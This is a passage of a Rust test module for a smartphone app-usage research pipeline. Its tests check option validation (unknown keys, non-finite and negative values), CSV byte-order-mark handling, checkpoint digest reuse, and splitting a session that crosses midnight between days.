                    .unwrap_or_else(|error| panic!("{request_key}={value} parses: {error}"))
                    .into_pipeline_options();
                assert_eq!(effective(&options), *value, "{request_key}={value}");
                if b06 {
                    assert!(
                        match request_key.as_str() {
                            "maximum_duration_policy" => b06::MaximumDurationPolicy::from_canonical_id_strict(value).map(|arm| arm.canonical_id() == value),
                            "maximum_duration_disposition" => b06::MaximumDurationDisposition::from_canonical_id_strict(value).map(|arm| arm.canonical_id() == value),
                            _ => b06::MaximumDurationThresholdSource::from_canonical_id_strict(value).map(|arm| arm.canonical_id() == value),
                        } == Ok(true),
                        "{request_key}={value} resolves to its own arm",
                    );
                }
            }

            let unknown = with(UNKNOWN);
            if b06 {
                // Parsed as a raw vector, then refused before anything runs.
                let options = parse_request(&unknown).expect("B06 is judged at resolution").into_pipeline_options();
                assert_eq!(
                    validate_pipeline_v2_options(&options).map_err(|error| error.to_string()),
                    Err(PipelineV2OptionsValidationError::MaximumDuration(
                        b06::MaximumDurationRefusalReason::RequestShapeInvalid
                    )
                    .to_string()),
                    "{request_key}",
                );
            } else {
                let error = parse_request(&unknown).expect_err("an unknown arm is refused");
                assert!(
                    error.to_string().contains(&format!("unknown_{request_key}")),
                    "{request_key}: {error}",
                );
            }
        }
    }

    /// An option key the kernel does not know is a renamed or stale key, and
    /// without `deny_unknown_fields` serde drops it and the field silently
    /// takes its published default — the run then computes something other
    /// than what was asked for and reports nothing. The enclosing
    /// `RuntimeRequest` has refused unknown members all along; this pins the
    /// same refusal on the options document itself.
    #[test]
    fn an_unknown_option_key_is_refused_and_named() {
        let request = minimal_options_request();

        // Non-vacuity: the correctly spelled key is read, and the value used
        // here is not the value an ignored key would have left behind.
        let mut spelled = request.clone();
        spelled["credited_session_cap_minutes"] = 999.0.into();
        let parsed: PipelineV2OptionsJson =
            serde_json::from_value(spelled).expect("the correctly spelled key parses");
        assert_eq!(parsed.credited_session_cap_minutes, 999.0);
        assert_ne!(
            parsed.credited_session_cap_minutes,
            serde_json::from_value::<PipelineV2OptionsJson>(request.clone())
                .expect("the minimal request parses")
                .credited_session_cap_minutes,
            "the probe value equals the default, so an ignored key would be invisible",
        );

        let mut stale = request;
        stale["credited_session_cap_mins"] = 999.0.into();
        let error = serde_json::from_value::<PipelineV2OptionsJson>(stale)
            .expect_err("an unknown option key must be refused, not defaulted");
        assert!(
            error.to_string().contains("credited_session_cap_mins"),
            "the refusal must name the offending key, got: {error}",
        );
    }

    /// Every real-valued option reaches a comparison, an integer conversion,
    /// or a `to_bits()` Salsa cache key, and none of those reject `NaN` or an
    /// infinity: an infinite bound silently answers every comparison, and the
    /// two `NaN` spellings key as different inputs for the same request.
    ///
    /// The JSON ingress is measured here, not assumed: `serde_json` refuses
    /// `1e999` outright ("number out of range"), and JavaScript's
    /// `JSON.stringify` turns `Infinity` and `NaN` into `null`, which fails
    /// the `f64` field type. So a browser request cannot carry a non-finite
    /// number today, and the first assertion below fails loudly if that ever
    /// stops being true. The gate exists for the other producers of this
    /// public type — the native profiling examples, the campaign harnesses,
    /// and any future caller that builds `PipelineV2Options` directly, none of
    /// which pass through serde at all.
    ///
    /// The covered set is not a hand list: `real_valued_option_fields` is an
    /// exhaustive `#[deny(unused_variables)]` destructure of
    /// `PipelineV2Options`, so a new option must be classified there, and the
    /// setter table below is asserted to cover exactly the fields it names.
    #[test]
    fn every_real_valued_option_refuses_a_non_finite_request_value() {
        #[deny(unused_variables)]
        fn real_valued_option_fields(options: &PipelineV2Options) -> BTreeSet<&'static str> {
            fn real<T: ?Sized>(name: &'static str, _field: &T) -> Option<&'static str> {
                Some(name)
            }
            fn not_real<T: ?Sized>(_field: &T) -> Option<&'static str> {
                None
            }
            let PipelineV2Options {
                study_name,
                timezone,
                timezone_handling,
                usage_session_mode,
                include_app_output,
                include_screen_output,
                use_filter_file,
                use_apps_forcing_screen_open,
                use_background_apps_file,
                use_app_codebook,
                include_category_column,
                include_app_usage_end_reason,
                neutralize_spreadsheet_formulas,
                deduplicate_exact_rows,
                drop_out_of_source_order_events,
                interaction_type_remap,
                correct_duplicate_event_timestamps,
                allow_stop_event_reuse,
                use_activity_stopped_as_fallback,
                apply_threshold_to_fallback,
                long_duration_threshold_ns,
                proximity_interval_ns,
                custom_app_engagement_duration,
                long_data_time_gap_thresholds,
                long_usage_duration_thresholds,
                same_app_stop_types,
                other_stop_types,
                interaction_types_to_remove,
                interaction_type_removal_mode,
                screen_auto_lock_timeout_seconds,
                screen_auto_lock_tolerance_seconds,
                screen_manual_lock_max_tail_seconds,
                screen_keyguard_near_stop_seconds,
                datetime_of_preprocessing,
                model_concurrent_usage,
                micro_use_classification_policy,
                micro_use_classification_policy_explicit,
                minimum_usage_duration,
                minimum_usage_duration_explicit,
                minimum_duration_comparator,
                minimum_duration_comparator_explicit,
                minimum_duration_disposition,
                minimum_duration_disposition_explicit,
                apply_minimum_usage_duration_to_concurrent_subintervals,
                filter_zero_duration_sessions,
                add_no_activity_placeholder_days,
                enable_study_window_filter,
                enable_person_attribution,
                enable_day_coverage,
                enable_compliance_scoring,
                compliance_threshold_percent,
                enable_screen_gated_crediting,
                screen_gating_rule,
                day_boundary_attribution,
                package_exclusion_preset,
                notification_proxy_rule,
                polled_emulation_method,
                polled_emulation_interval_seconds,
                polled_emulation_gap_seconds,
                interval_expansion_method,
                enable_aggregates,
                aggregate_shape,
                aggregate_top_apps_limit,
                enable_participant_amount_summary,
                materialize_visualization_data,
                credited_session_cap_minutes,
                device_liveness_gap_tolerance_minutes,
                auto_lock_bridge_seconds,
                bridge_screen_off_to_session_end,
                no_witness_min_day_apps,
                screen_session_construction_strategy,
                screen_session_construction_strategy_explicit,
                screen_session_classification_policy,
                screen_session_maximum_duration_minutes,
                screen_session_maximum_duration_disposition,
                locked_screen_audio_disposition,
                opener_set,
                episode_reconstruction_strategy,
                interval_quality_policy,
                session_grouping_policy,
                session_gap_basis,
                session_boundary_scope,
                emit_session_break_lineage,
                event_retention_set,
                maximum_duration,
                filter_match_field,
                application_label_exclusions,
            } = options;
            [
                not_real(study_name),
                not_real(timezone),
                not_real(timezone_handling),
                not_real(usage_session_mode),
                not_real(include_app_output),
                not_real(include_screen_output),
                not_real(use_filter_file),
                not_real(filter_match_field),
                not_real(application_label_exclusions),
                not_real(use_apps_forcing_screen_open),
                not_real(use_background_apps_file),
                not_real(use_app_codebook),
                not_real(include_category_column),
                not_real(include_app_usage_end_reason),
                not_real(neutralize_spreadsheet_formulas),
                not_real(deduplicate_exact_rows),
                not_real(drop_out_of_source_order_events),
                not_real(interaction_type_remap),
                not_real(correct_duplicate_event_timestamps),
                not_real(allow_stop_event_reuse),
                not_real(use_activity_stopped_as_fallback),
                not_real(apply_threshold_to_fallback),
                not_real(long_duration_threshold_ns),
                not_real(proximity_interval_ns),
                real(
                    "custom_app_engagement_duration",
                    custom_app_engagement_duration,
                ),
                real(
                    "long_data_time_gap_thresholds",
                    long_data_time_gap_thresholds,
                ),
                real(
                    "long_usage_duration_thresholds",
                    long_usage_duration_thresholds,
                ),
                not_real(same_app_stop_types),
                not_real(other_stop_types),
                not_real(interaction_types_to_remove),
                not_real(interaction_type_removal_mode),
                real(
                    "screen_auto_lock_timeout_seconds",
                    screen_auto_lock_timeout_seconds,
                ),
                real(
                    "screen_auto_lock_tolerance_seconds",
                    screen_auto_lock_tolerance_seconds,
                ),
                real(
                    "screen_manual_lock_max_tail_seconds",
                    screen_manual_lock_max_tail_seconds,
                ),
                real(
                    "screen_keyguard_near_stop_seconds",
                    screen_keyguard_near_stop_seconds,
                ),
                not_real(datetime_of_preprocessing),
                not_real(model_concurrent_usage),
                not_real(micro_use_classification_policy),
                not_real(micro_use_classification_policy_explicit),
                // Deliberate table divergence: `validate_option_real_numbers`
                // routes this field to `not_a_real_number` because
                // `checked_minimum_duration_threshold_ns` runs FIRST and refuses
                // a non-finite value with the byte-identical rendered string --
                // so this case exercises that earlier guard, not the destructure
                // gate. Classified `real` here so the refusal is still asserted.
                real("minimum_usage_duration", minimum_usage_duration),
                not_real(minimum_usage_duration_explicit),
                not_real(minimum_duration_comparator),
                not_real(minimum_duration_comparator_explicit),
                not_real(minimum_duration_disposition),
                not_real(minimum_duration_disposition_explicit),
                not_real(apply_minimum_usage_duration_to_concurrent_subintervals),
                not_real(filter_zero_duration_sessions),
                not_real(add_no_activity_placeholder_days),
                not_real(enable_study_window_filter),
                not_real(enable_person_attribution),
                not_real(enable_day_coverage),
                not_real(enable_compliance_scoring),
                real("compliance_threshold_percent", compliance_threshold_percent),
                not_real(enable_screen_gated_crediting),
                not_real(screen_gating_rule),
                not_real(day_boundary_attribution),
                not_real(package_exclusion_preset),
                not_real(notification_proxy_rule),
                not_real(polled_emulation_method),
                real(
                    "polled_emulation_interval_seconds",
                    polled_emulation_interval_seconds,
                ),
                real("polled_emulation_gap_seconds", polled_emulation_gap_seconds),
                not_real(interval_expansion_method),
                not_real(enable_aggregates),
                not_real(aggregate_shape),
                not_real(aggregate_top_apps_limit),
                not_real(enable_participant_amount_summary),
                not_real(materialize_visualization_data),
                real("credited_session_cap_minutes", credited_session_cap_minutes),
                real(
                    "device_liveness_gap_tolerance_minutes",
                    device_liveness_gap_tolerance_minutes,
                ),
                real("auto_lock_bridge_seconds", auto_lock_bridge_seconds),
                not_real(bridge_screen_off_to_session_end),
                not_real(no_witness_min_day_apps),
                not_real(screen_session_construction_strategy),
                not_real(screen_session_construction_strategy_explicit),
                not_real(screen_session_classification_policy),
                real(
                    "screen_session_maximum_duration_minutes",
                    screen_session_maximum_duration_minutes,
                ),
                not_real(screen_session_maximum_duration_disposition),
                not_real(locked_screen_audio_disposition),
                not_real(opener_set),
                not_real(episode_reconstruction_strategy),
                not_real(interval_quality_policy),
                not_real(session_grouping_policy),
                not_real(session_gap_basis),
                not_real(session_boundary_scope),
                not_real(emit_session_break_lineage),
                not_real(event_retention_set),
                not_real(maximum_duration),
            ]
            .into_iter()
            .flatten()
            .collect()
        }

        // Measured, not assumed: neither spelling of a non-finite number
        // survives the JSON ingress. If either of these ever parses, the
        // options gate below is the only thing standing between a browser
        // request and an infinite comparison bound.
        let mut request = minimal_options_request();
        request["screen_auto_lock_timeout_seconds"] = serde_json::Value::Null;
        let template = serde_json::to_string(&request).expect("request serializes");
        for spelling in ["1e999", "null"] {
            let text = template.replace(
                "\"screen_auto_lock_timeout_seconds\":null",
                &format!("\"screen_auto_lock_timeout_seconds\":{spelling}"),
            );
            let refusal = serde_json::from_str::<PipelineV2OptionsJson>(&text)
                .err()
                .map(|error| error.to_string())
                .unwrap_or_else(|| {
                    panic!("a {spelling} screen timeout reached the options through serde")
                });
            assert!(
                refusal.contains("number out of range") || refusal.contains("invalid type: null"),
                "{spelling} was refused for an unexpected reason: {refusal}",
            );
        }

        type Setter = Box<dyn Fn(&mut PipelineV2Options, f64)>;
        let setters: Vec<(&'static str, Setter)> = vec![
            (
                "custom_app_engagement_duration",
                Box::new(|o: &mut PipelineV2Options, v: f64| o.custom_app_engagement_duration = v),
            ),
            (
                "long_data_time_gap_thresholds",
                Box::new(|o: &mut PipelineV2Options, v: f64| {
                    o.long_data_time_gap_thresholds = vec![1.0, v]
                }),
            ),
            (
                "long_usage_duration_thresholds",
                Box::new(|o: &mut PipelineV2Options, v: f64| {
                    o.long_usage_duration_thresholds = vec![1.0, v]
                }),
            ),
            (
                "screen_auto_lock_timeout_seconds",
                Box::new(|o: &mut PipelineV2Options, v: f64| {
                    o.screen_auto_lock_timeout_seconds = v
                }),
            ),
            (
                "screen_auto_lock_tolerance_seconds",
                Box::new(|o: &mut PipelineV2Options, v: f64| {
                    o.screen_auto_lock_tolerance_seconds = v
                }),
            ),
            (
                "screen_manual_lock_max_tail_seconds",
                Box::new(|o: &mut PipelineV2Options, v: f64| {
                    o.screen_manual_lock_max_tail_seconds = v
                }),
            ),
            (
                "screen_keyguard_near_stop_seconds",
                Box::new(|o: &mut PipelineV2Options, v: f64| {
                    o.screen_keyguard_near_stop_seconds = v
                }),
            ),
            (
                "screen_session_maximum_duration_minutes",
                Box::new(|o: &mut PipelineV2Options, v: f64| {
                    o.screen_session_maximum_duration_minutes = v
                }),
            ),
            (
                "minimum_usage_duration",
                Box::new(|o: &mut PipelineV2Options, v: f64| o.minimum_usage_duration = v),
            ),
            (
                "compliance_threshold_percent",
                Box::new(|o: &mut PipelineV2Options, v: f64| o.compliance_threshold_percent = v),
            ),
            (
                "polled_emulation_interval_seconds",
                Box::new(|o: &mut PipelineV2Options, v: f64| {
                    o.polled_emulation_interval_seconds = v
                }),
            ),
            (
                "polled_emulation_gap_seconds",
                Box::new(|o: &mut PipelineV2Options, v: f64| o.polled_emulation_gap_seconds = v),
            ),
            (
                "credited_session_cap_minutes",
                Box::new(|o: &mut PipelineV2Options, v: f64| o.credited_session_cap_minutes = v),
            ),
            (
                "device_liveness_gap_tolerance_minutes",
                Box::new(|o: &mut PipelineV2Options, v: f64| {
                    o.device_liveness_gap_tolerance_minutes = v
                }),
            ),
            (
                "auto_lock_bridge_seconds",
                Box::new(|o: &mut PipelineV2Options, v: f64| o.auto_lock_bridge_seconds = v),
            ),
        ];

        let baseline = test_options();
        validate_pipeline_v2_options(&baseline).expect(
            "the baseline options are valid, or every case below passes for the wrong reason",
        );
        assert_eq!(
            setters.iter().map(|(name, _)| *name).collect::<BTreeSet<_>>(),
            real_valued_option_fields(&baseline),
            "the setter table and the exhaustive destructure disagree about which options carry a real number",
        );

        for (name, set) in &setters {
            for bad in [f64::INFINITY, f64::NEG_INFINITY, f64::NAN] {
                let mut options = baseline.clone();
                set(&mut options, bad);
                let error = validate_pipeline_v2_options(&options)
                    .expect_err(&format!("{name} accepted {bad}"));
                assert_eq!(
                    error.to_string(),
                    format!("pipeline_options_invalid:{name}:non_finite"),
                    "{name} was refused, but not as a non-finite {name}",
                );
            }
        }

        // A negative keyguard window inverted a slice range in the screen
        // classifier; the four screen timings are refused below zero.
        for name in [
            "screen_auto_lock_timeout_seconds",
            "screen_auto_lock_tolerance_seconds",
            "screen_manual_lock_max_tail_seconds",
            "screen_keyguard_near_stop_seconds",
        ] {
            let (_, set) = setters.iter().find(|(field, _)| *field == name).expect("setter");
            let mut options = baseline.clone();
            set(&mut options, -2.0);
            assert_eq!(
                validate_pipeline_v2_options(&options).expect_err("negative").to_string(),
                format!("pipeline_options_invalid:{name}:negative"),
            );
        }
    }

    /// Excel's "CSV UTF-8" starts the file with a byte-order mark. Support-file
    /// validation strips it, so the parser the lookups are built from must too.
    #[test]
    fn a_byte_order_mark_does_not_hide_the_first_support_column() {
        let bytes = b"\xEF\xBB\xBFparticipant_id,start_date,end_date\nP01,2026-01-05,2026-01-10\n";
        validate_support_csv("study_dates_file", bytes).expect("validates");
        let windows = parse_study_windows(bytes).expect("parses");
        assert_eq!(windows.len(), 1, "the participant column was read");
        assert_eq!(windows[0].participant_id, "P01");
    }

    /// Every label the screen channel closes a session on is an OFF witness
    /// for credit, and the fused type-15 label is an ON witness.
    #[test]
    fn screen_credit_reads_the_fused_and_device_level_screen_labels() {
        for label in SCREEN_STOP_EVENTS {
            assert_eq!(
                screen_witness_state(label).expect("mapped"),
                Some(ScreenCreditState::Off),
                "{label}",
            );
        }
        for label in SCREEN_START_EVENTS {
            assert_eq!(
                screen_witness_state(label).expect("mapped"),
                Some(ScreenCreditState::On),
                "{label}",
            );
        }
    }

    /// The smallest request document that parses: every key without a serde
    /// default, and nothing else.
    fn minimal_options_request() -> serde_json::Value {
        serde_json::json!({
            "study_name": "Study",
            "timezone": "UTC",
            "usage_session_mode": "app_usage",
            "include_app_output": true,
            "include_screen_output": true,
            "use_filter_file": false,
            "use_apps_forcing_screen_open": false,
            "use_app_codebook": false,
            "correct_duplicate_event_timestamps": true,
            "allow_stop_event_reuse": false,
            "use_activity_stopped_as_fallback": true,
            "apply_threshold_to_fallback": true,
            "long_duration_threshold_ns": 43_200_000_000_000_i64,
            "custom_app_engagement_duration": 300.0,
            "long_data_time_gap_thresholds": [1.0],
            "long_usage_duration_thresholds": [1.0],
            "same_app_stop_types": ["Activity Paused"],
            "other_stop_types": ["Activity Resumed"],
            "interaction_types_to_remove": [],
            "screen_auto_lock_timeout_seconds": 120.0,
            "screen_auto_lock_tolerance_seconds": 30.0,
            "screen_manual_lock_max_tail_seconds": 30.0,
            "screen_keyguard_near_stop_seconds": 2.0,
            "datetime_of_preprocessing": "2026-07-21 12:00:00 UTC",
        })
    }

    /// Two ways of asking the same question: which parts of the previous
    /// step's checkpoint may be carried into this one. One compares cached
    /// checkpoint parts on both sides, the other re-derives the previous side
    /// from the rows themselves. Carrying a component that actually moved
    /// publishes a digest describing values the rows no longer hold, so each
    /// component has to be able to say no on its own — and the two ways have
    /// to give the same answer.
    #[test]
    fn component_reuse_says_no_for_exactly_the_parts_that_moved() {
        let rows = rows_from_events(&[
            (
                "2026-03-07 10:00:00",
                "Activity Resumed",
                "com.example.chat",
            ),
            ("2026-03-07 10:01:00", "Activity Paused", "com.example.chat"),
            (
                "2026-03-07 10:02:00",
                "Activity Resumed",
                "com.example.video",
            ),
        ]);
        let parts = row_checkpoint_parts_for_rows(&rows);
        assert_eq!(
            reusable_row_components_from_parts(&parts, &parts),
            (true, true, true, true),
            "unchanged rows share every component",
        );
        assert_eq!(
            reusable_row_components_from_rows(&parts, &rows),
            (true, true, true, true),
            "unchanged rows share every component",
        );

        type Disturb = fn(&mut Row);
        #[allow(clippy::type_complexity)]
        let cases: [(&str, Disturb, (bool, bool, bool, bool)); 3] = [
            (
                "identity",
                |row| *row.edit_identity().source_data_rows = SourceDataRows::single(9_999),
                (false, false, false, false),
            ),
            (
                "temporal",
                |row| {
                    let data = row.edit_temporal();
                    *data.duration_seconds = Some(data.duration_seconds.unwrap_or_default() + 1.0);
                },
                (true, true, false, true),
            ),
            (
                "classification",
                |row| *row.edit_classification().application_label = "Moved".into(),
                (true, true, true, false),
            ),
        ];
        for (component, disturb, expected) in cases {
            let mut changed = rows.clone();
            disturb(&mut changed[0]);
            let changed_parts = row_checkpoint_parts_for_rows(&changed);
            assert_eq!(
                reusable_row_components_from_parts(&changed_parts, &parts),
                expected,
                "a {component} change was answered wrongly from cached parts",
            );
            assert_eq!(
                reusable_row_components_from_rows(&changed_parts, &rows),
                expected,
                "a {component} change was answered wrongly from the previous rows",
            );
        }

        // A step that added or dropped rows shares nothing, whichever row
        // count the two sides happen to have.
        let shorter = rows[..rows.len() - 1].to_vec();
        let shorter_parts = row_checkpoint_parts_for_rows(&shorter);
        assert_eq!(
            reusable_row_components_from_parts(&shorter_parts, &parts),
            (false, false, false, false),
        );
        assert_eq!(
            reusable_row_components_from_rows(&shorter_parts, &rows),
            (false, false, false, false),
        );
        assert_eq!(
            reusable_row_components_from_parts(&parts, &shorter_parts),
            (false, false, false, false),
        );
        assert_eq!(
            reusable_row_components_from_rows(&parts, &shorter),
            (false, false, false, false),
        );
    }

    #[test]
    fn canonical_checkpoint_fast_path_matches_unsorted_fallback() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,A,Activity Resumed,a,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Child,B,Activity Resumed,b,2026-03-07 10:01:00,UTC\n",
            "Study,P01,Child,C,Activity Resumed,c,2026-03-07 10:02:00,UTC\n",
            "Study,P01,Child,D,Activity Resumed,d,2026-03-07 10:03:00,UTC\n",
        );
        let raw = incremental::decode_source_records(csv.as_bytes());
        let model = incremental::attach_device_models(&raw);
        let rows = incremental::canonicalize_source_rows(&raw, "UTC", &BTreeMap::new(), &model)
            .expect("canonical rows");

        let source = workflow_checkpoint("source-step", &[("rows", &rows)], &[]);
        let parts = row_checkpoint_parts_for_rows(&rows);
        let payload = br#"{"enabled":true}"#;
        let reused = workflow_checkpoint_with_reusable_parts(
            "target-step",
            &rows,
            &[("value", payload.as_slice())],
            &parts,
            &parts,
            &source,
        );
        let recomputed = workflow_checkpoint(
            "target-step",
            &[("rows", &rows)],
            &[("value", payload.as_slice())],
        );
        assert_eq!(reused, recomputed);

        let compare_order_independent_components = |left: &[Row], right: &[Row]| {
            let left = workflow_checkpoint("fast-path-proof", &[("rows", left)], &[]);
            let right = workflow_checkpoint("fast-path-proof", &[("rows", right)], &[]);
            assert_eq!(left.row_membership_digest, right.row_membership_digest);
            assert_eq!(left.temporal_state_digest, right.temporal_state_digest);
            assert_eq!(left.classification_digest, right.classification_digest);
            assert_eq!(left.payload_digest, right.payload_digest);
            assert_eq!(left.schema_digest, right.schema_digest);
        };

        compare_order_independent_components(&[], &[]);
        compare_order_independent_components(&rows[..1], &rows[..1]);

        let mut reversed = rows.clone();
        reversed.reverse();
        compare_order_independent_components(&rows, &reversed);

        let mut duplicate_identity = vec![rows[0].clone(), rows[0].clone()];
        duplicate_identity[0].index = 11;
        duplicate_identity[1].index = 12;
        let mut duplicate_reversed = duplicate_identity.clone();
        duplicate_reversed.reverse();
        compare_order_independent_components(&duplicate_identity, &duplicate_reversed);

        let mut state = 0x4d59_5df4_d0f3_3173_u64;
        for _ in 0..64 {
            let mut shuffled = rows.clone();
            for index in (1..shuffled.len()).rev() {
                state = state
                    .wrapping_mul(6_364_136_223_846_793_005)
                    .wrapping_add(1_442_695_040_888_963_407);
                shuffled.swap(index, (state as usize) % (index + 1));
            }
            compare_order_independent_components(&rows, &shuffled);
        }
    }

    #[test]
    fn known_membership_and_order_checkpoint_and_filter_fallback_match_full_reference() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,A,Activity Resumed,a,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Child,B,Activity Resumed,b,2026-03-07 10:01:00,UTC\n",
            "Study,P01,Child,C,Activity Resumed,c,2026-03-07 10:02:00,UTC\n",
        );
        let raw = incremental::decode_source_records(csv.as_bytes());
        let model = incremental::attach_device_models(&raw);
        let previous_rows =
            incremental::canonicalize_source_rows(&raw, "UTC", &BTreeMap::new(), &model)
                .expect("canonical rows");
        let previous_checkpoint =
            workflow_checkpoint("source-step", &[("rows", &previous_rows)], &[]);

        let mut rows = previous_rows.clone();
        *rows[0].edit_temporal().duration_seconds = Some(60.0);
        *rows[1].edit_classification().application_label = "Changed".into();
        let payload = br#"{"enabled":false,"upstreamDigest":"fixed"}"#;
        let optimized = workflow_checkpoint_with_known_membership_and_order(
            "remove_zero_duration_rows",
            &rows,
            &[("value", payload.as_slice())],
            &previous_rows,
            &previous_checkpoint,
        );
        let reference = workflow_checkpoint(
            "remove_zero_duration_rows",
            &[("rows", &rows)],
            &[("value", payload.as_slice())],
        );

        assert_eq!(optimized, reference);
        assert_eq!(
            optimized.row_membership_digest,
            previous_checkpoint.row_membership_digest
        );
        assert_eq!(
            optimized.row_order_digest,
            previous_checkpoint.row_order_digest
        );
        assert_ne!(
            optimized.temporal_state_digest,
            previous_checkpoint.temporal_state_digest
        );
        assert_ne!(
            optimized.classification_digest,
            previous_checkpoint.classification_digest
        );

        let filtered_rows = rows[1..].to_vec();
        let filtered_parts = row_checkpoint_parts_for_rows(&filtered_rows);
        let fallback = workflow_checkpoint_with_reusable_rows(
            "remove_zero_duration_rows",
            &filtered_rows,
            &[("value", payload.as_slice())],
            &filtered_parts,
            &previous_rows,
            &previous_checkpoint,
        );
        let filtered_reference = workflow_checkpoint(
            "remove_zero_duration_rows",
            &[("rows", &filtered_rows)],
            &[("value", payload.as_slice())],
        );
        assert_eq!(fallback, filtered_reference);
        assert_ne!(
            fallback.row_membership_digest,
            previous_checkpoint.row_membership_digest
        );
        assert_ne!(
            fallback.row_order_digest,
            previous_checkpoint.row_order_digest
        );
    }

    pub(super) fn test_options() -> PipelineV2Options {
        PipelineV2Options {
            study_name: "Shadow Study".into(),
            include_app_usage_end_reason: false,
            neutralize_spreadsheet_formulas: false,
            timezone: "America/Chicago".into(),
            timezone_handling: "selected-convert".into(),
            usage_session_mode: UsageSessionMode::AppUsage,
            screen_session_construction_strategy: ScreenSessionConstructionStrategyId::default(),
            screen_session_construction_strategy_explicit: false,
            screen_session_classification_policy: ScreenSessionClassificationPolicy::None,
            screen_session_maximum_duration_minutes: 0.0,
            screen_session_maximum_duration_disposition:
                ScreenSessionMaximumDurationDisposition::None,
            locked_screen_audio_disposition: LockedScreenAudioDisposition::Include,
            episode_reconstruction_strategy: EpisodeReconstructionStrategy::FusedMatcher,
            opener_set: OpenerSet::StrategyDefined,
            interval_quality_policy: IntervalQualityPolicy::None,
            session_grouping_policy: SessionGroupingPolicy::None,
            session_gap_basis: SessionGapBasis::default(),
            session_boundary_scope: SessionBoundaryScope::default(),
            emit_session_break_lineage: false,
            event_retention_set: EventRetentionSet::None,
            maximum_duration: b06::MaximumDurationRequest::default(),
            include_app_output: true,
            include_screen_output: false,
            use_filter_file: false,
            use_apps_forcing_screen_open: false,
            use_background_apps_file: false,
            use_app_codebook: false,
            include_category_column: false,
            deduplicate_exact_rows: true,
            drop_out_of_source_order_events: false,
            interaction_type_remap: Vec::new(),
            correct_duplicate_event_timestamps: true,
            allow_stop_event_reuse: false,
            use_activity_stopped_as_fallback: true,
            apply_threshold_to_fallback: true,
            long_duration_threshold_ns: 43_200_000_000_000,
            proximity_interval_ns: 0,
            custom_app_engagement_duration: 300.0,
            long_data_time_gap_thresholds: (1..=12).map(f64::from).collect(),
            long_usage_duration_thresholds: (1..=12).map(f64::from).collect(),
            same_app_stop_types: vec!["Activity Paused".into(), "Activity Resumed".into()],
            other_stop_types: vec!["Activity Resumed".into(), "Device Shutdown".into()],
            interaction_types_to_remove: Vec::new(),
            interaction_type_removal_mode: InteractionTypeRemovalMode::GapPreserving,
            screen_auto_lock_timeout_seconds: 120.0,
            screen_auto_lock_tolerance_seconds: 30.0,
            screen_manual_lock_max_tail_seconds: 30.0,
            screen_keyguard_near_stop_seconds: 2.0,
            datetime_of_preprocessing: "2026-07-21 12:00:00 UTC".into(),
            model_concurrent_usage: false,
            micro_use_classification_policy: MicroUseClassificationPolicy::None,
            micro_use_classification_policy_explicit: false,
            minimum_usage_duration: 60.0,
            minimum_usage_duration_explicit: false,
            minimum_duration_comparator: MinimumDurationComparator::StrictLt,
            minimum_duration_comparator_explicit: false,
            minimum_duration_disposition: MinimumDurationDisposition::ChronicleBlankKeepRow,
            minimum_duration_disposition_explicit: false,
            apply_minimum_usage_duration_to_concurrent_subintervals: false,
            filter_zero_duration_sessions: false,
            add_no_activity_placeholder_days: false,
            enable_study_window_filter: false,
            enable_person_attribution: false,
            enable_day_coverage: false,
            enable_compliance_scoring: false,
            compliance_threshold_percent: 70.0,
            enable_screen_gated_crediting: false,
            enable_aggregates: false,
            aggregate_shape: "wide".into(),
            aggregate_top_apps_limit: 0,
            enable_participant_amount_summary: false,
            materialize_visualization_data: true,
            credited_session_cap_minutes: 360.0,
            device_liveness_gap_tolerance_minutes: 120.0,
            auto_lock_bridge_seconds: 120.0,
            bridge_screen_off_to_session_end: false,
            no_witness_min_day_apps: 2,
            screen_gating_rule: ScreenGatingRule::default(),
            day_boundary_attribution: DayBoundaryAttribution::default(),
            filter_match_field: FilterMatchField::AppPackageName,
            application_label_exclusions: Vec::new(),
            package_exclusion_preset: PackageExclusionPreset::AllSuppliedRows,
            notification_proxy_rule: NotificationProxyRule::None,
            polled_emulation_method: PolledEmulationMethod::None,
            polled_emulation_interval_seconds: 10.0,
            polled_emulation_gap_seconds: 15.0,
            interval_expansion_method: IntervalExpansionMethod::None,
        }
    }

    /// B14: a session that runs past local midnight belongs to two calendar
    /// days. Under the default rule the whole session is still attributed to
    /// the day it started, which is what every earlier release recorded.
    #[test]
    fn a_session_that_spans_local_midnight_is_divided_into_one_row_per_day() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            // Source timestamps are UTC; `selected-convert` renders them in
            // America/Chicago, where they read 23:40 and 00:20 across midnight.
            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 05:40:00,UTC\n",
            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-03-07 06:20:00,UTC\n",
        );
        let day_of = |rows: &[(u32, HashMap<String, String>)], index: usize| {
            rows[index]
                .1
                .get("date")
                .cloned()
                .expect("every app row carries a date")
        };
        let seconds_of = |rows: &[(u32, HashMap<String, String>)], index: usize| {
            rows[index]
                .1
                .get("duration_seconds")
                .expect("every app row carries a duration")
                .parse::<f64>()
                .expect("the duration column is numeric")
        };

        let mut options = test_options();
        let whole = run_pipeline_v2_with_supports(
            csv.as_bytes(),
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("the undivided run succeeds");
        let whole_rows = parse_csv_to_records_with_physical_rows(&whole.app_csv_bytes.to_vec());
        assert_eq!(whole_rows.len(), 1);
        assert_eq!(day_of(&whole_rows, 0), "2026-03-06");
        assert_eq!(seconds_of(&whole_rows, 0), 2_400.0);

        options.day_boundary_attribution = DayBoundaryAttribution::SplitAtLocalMidnight;
        let divided = run_pipeline_v2_with_supports(
            csv.as_bytes(),
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("the divided run succeeds");
        let divided_rows = parse_csv_to_records_with_physical_rows(&divided.app_csv_bytes.to_vec());
        assert_eq!(divided_rows.len(), 2);
        assert_eq!(day_of(&divided_rows, 0), "2026-03-06");
        assert_eq!(day_of(&divided_rows, 1), "2026-03-07");
        assert_eq!(seconds_of(&divided_rows, 0), 1_200.0);
        assert_eq!(seconds_of(&divided_rows, 1), 1_200.0);
        assert_eq!(
            seconds_of(&divided_rows, 0) + seconds_of(&divided_rows, 1),
            seconds_of(&whole_rows, 0),
            "dividing a session must move time between days, never create or destroy it",
        );
